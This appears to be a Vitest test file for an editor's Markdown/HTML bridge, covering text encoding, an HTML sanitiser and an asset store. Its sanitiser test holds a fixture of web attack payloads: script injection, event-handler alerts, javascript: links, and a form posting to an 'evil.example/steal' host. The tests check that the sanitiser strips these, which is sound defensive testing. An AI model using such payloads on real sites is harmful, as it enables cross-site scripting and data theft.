// @vitest-environment jsdom
// GO-B4 (UNI-1014): the shared pieces of the Markdown / HTML bridges — text codec, static HTML
// copy, asset store.
import { describe, expect, it, vi } from 'vitest'
import { createMockPort } from '../../docs/bridge/testing/mock-port'
import { createAssetStore, normalizeAssetPath } from './assets'
import { staticCss, toStaticHtml } from './static-html'
import { decodeText, encodeText } from './text-codec'

const bytes = (...b: number[]) => new Uint8Array(b)

describe('text codec', () => {
  it('keeps a BOM and CRLF line endings: decode -> encode is the identity', () => {
    const input = new Uint8Array([
      0xef,
      0xbb,
      0xbf,
      ...new TextEncoder().encode('# T\r\n\r\nä ✓\r\n'),
    ])
    const decoded = decodeText(input)
    expect(decoded.exact).toBe(true)
    expect(decoded.text.startsWith('﻿')).toBe(true)
    expect(decoded.text).toContain('\r\n')
    expect(new Uint8Array(encodeText(decoded.text))).toEqual(input)
  })

  it('flags bytes that are not UTF-8 (they cannot round-trip through a string)', () => {
    const decoded = decodeText(bytes(0x61, 0xff, 0x62))
    expect(decoded.exact).toBe(false)
    expect(decoded.text).toBe('a�b')
  })
})

describe('static HTML copy (P1 preview / print)', () => {
  const HOSTILE = [
    '<!doctype html><html><head>',
    '<meta http-equiv="refresh" content="0;url=https://evil.example/">',
    '<base href="https://evil.example/">',
    '<link rel="stylesheet" href="https://cdn.example/x.css">',
    '<link rel="stylesheet" href="assets/site.css">',
    '<style>@import url(https://cdn.example/y.css); body{background:url(https://evil.example/bg.png)} .a{background:url(assets/bg.png)}</style>',
    '<script>parent.postMessage("pwned","*")</script>',
    '</head><body onload="alert(1)">',
    '<h1 style="background-image:url(\'https://evil.example/t.png\')">Title</h1>',
    '<img src="https://evil.example/pixel.gif" alt="remote">',
    '<img src="assets/logo.png" alt="local" srcset="https://evil.example/2x.png 2x">',
    '<img src="data:image/png;base64,iVBORw0KGgo=" alt="inline">',
    '<img src="missing/relative.png" alt="unmapped">',
    '<a href="javascript:alert(1)">js</a> <a href="https://example.com" target="_blank">out</a> <a href="#sec">in</a>',
    '<form action="https://evil.example/steal" method="post"><input name="q"><button formaction="https://evil.example/x">go</button></form>',
    '<iframe src="https://evil.example/frame"></iframe><object data="x.swf"></object><embed src="y.swf">',
    '<svg><image href="https://evil.example/i.png"/><use href="#ok"/></svg>',
    '<div onclick="alert(2)" onmouseover="alert(3)">text</div>',
    '</body></html>',
  ].join('\n')
  const resolve = (src: string) =>
    ({
      'assets/logo.png': '/assets/doc/logo',
      'assets/site.css': '/assets/doc/site',
      'assets/bg.png': '/assets/doc/bg',
    })[normalizeAssetPath(src)] ?? null

  const out = toStaticHtml(HOSTILE, resolve)
  const doc = new DOMParser().parseFromString(out, 'text/html')

  it('drops everything that runs, refreshes, rebases or embeds', () => {
    expect(doc.querySelector('script, iframe, object, embed, base, meta[http-equiv]')).toBeNull()
    expect(out).not.toMatch(/\son[a-z]+=/i)
    expect(out).not.toContain('javascript:')
  })

  it('no URL leaves the frame: remote and unmapped loads are removed, assets are mapped', () => {
    expect(out).not.toContain('evil.example/pixel')
    expect(out).not.toContain('cdn.example')
    expect(out).not.toContain('evil.example/bg.png')
    expect(out).not.toContain('evil.example/t.png')
    expect(out).not.toContain('evil.example/i.png')
    expect(out).not.toContain('srcset')
    expect(doc.querySelector('img[alt="local"]')?.getAttribute('src')).toBe('/assets/doc/logo')
    expect(doc.querySelector('img[alt="inline"]')?.getAttribute('src')).toMatch(/^data:image\/png/)
    expect(doc.querySelector('img[alt="remote"]')?.hasAttribute('src')).toBe(false)
    expect(doc.querySelector('img[alt="unmapped"]')?.hasAttribute('src')).toBe(false)
    expect([...doc.querySelectorAll('link')].map((l) => l.getAttribute('href'))).toEqual([
      '/assets/doc/site',
    ])
    expect(out).toContain('url("/assets/doc/bg")')
  })

  it('links and forms cannot navigate or submit', () => {
    // no href at all: in srcdoc even "#sec" would resolve against the embedding page
    expect(doc.querySelectorAll('a[href], area[href], a[target]').length).toBe(0)
    const kept = [...doc.querySelectorAll('a')].map((a) => a.getAttribute('data-gx-href'))
    expect(kept).toEqual([null, 'https://example.com', '#sec'])
    expect(doc.querySelectorAll('a[data-gx-link]').length).toBe(3)
    expect(doc.head.querySelector('style')?.textContent).toContain('a[data-gx-link]')
    expect(doc.querySelector('form')?.hasAttribute('action')).toBe(false)
    expect(doc.querySelector('[formaction]')).toBeNull()
  })

  it('keeps the visible document', () => {
    expect(doc.querySelector('h1')?.textContent).toBe('Title')
    expect(doc.querySelector('div')?.textContent).toBe('text')
    expect(out.startsWith('<!doctype html>')).toBe(true)
  })

  it('staticCss blanks remote url() and @import, keeps data images', () => {
    expect(staticCss('a{b:url("https://x/y.png")} @import "z.css";', () => null)).toBe('a{b:none} ')
    expect(staticCss('a{b:url(data:image/gif;base64,R0lG)}', () => null)).toContain(
      'data:image/gif',
    )
  })
})

describe('asset store', () => {
  it('maps OpenPayload.assets both ways and reads data: pictures locally', async () => {
    const mock = createMockPort()
    const store = createAssetStore(mock.port, { fileId: () => 'f1', canUpload: () => false })
    store.reset({ './assets/a.png': '/u/a' })
    expect(store.resolve('assets/a.png')).toBe('/u/a')
    expect(store.unresolve('/u/a')).toBe('assets/a.png')
    expect(store.resolve('assets/b.png')).toBeNull()
    expect(await store.read('data:image/png;base64,iVBORw0KGgo=')).toEqual({
      mime: 'image/png',
      base64: 'iVBORw0KGgo=',
    })
    expect(await store.read('https://remote.example/x.png')).toBeNull()
  })

  it('uploads with the images grant and authors assets/<name>; embeds a data: URI without it', async () => {
    const mock = createMockPort()
    let grant = true
    const store = createAssetStore(mock.port, { fileId: () => 'f1', canUpload: () => grant })
    const src = await store.store(bytes(0x89, 0x50, 0x4e, 0x47), 'png')
    expect(src).toMatch(/^assets\/image-\d{8}-\d{6}-[a-z0-9]+\.png$/)
    expect(store.resolve(src!)).toBe('/img/i1')
    const upload = mock.calls.find((c) => c.type === 'api.images.upload')!
    expect(upload.payload).toMatchObject({ fileId: 'f1', mimeType: 'image/png' })

    grant = false
    expect(await store.store(bytes(1, 2, 3), 'gif')).toBe('data:image/gif;base64,AQID')
    expect(await store.store(bytes(1), 'bmp')).toBeNull()
  })

  it('falls back to embedding when the upload fails', async () => {
    const mock = createMockPort()
    mock.override('api.images.upload', () => Promise.reject(new Error('boom')))
    const warn = vi.spyOn(console, 'warn').mockImplementation(() => {})
    const store = createAssetStore(mock.port, { fileId: () => 'f1', canUpload: () => true })
    expect(await store.store(bytes(1, 2, 3), 'jpg')).toBe('data:image/jpeg;base64,AQID')
    warn.mockRestore()
  })
})
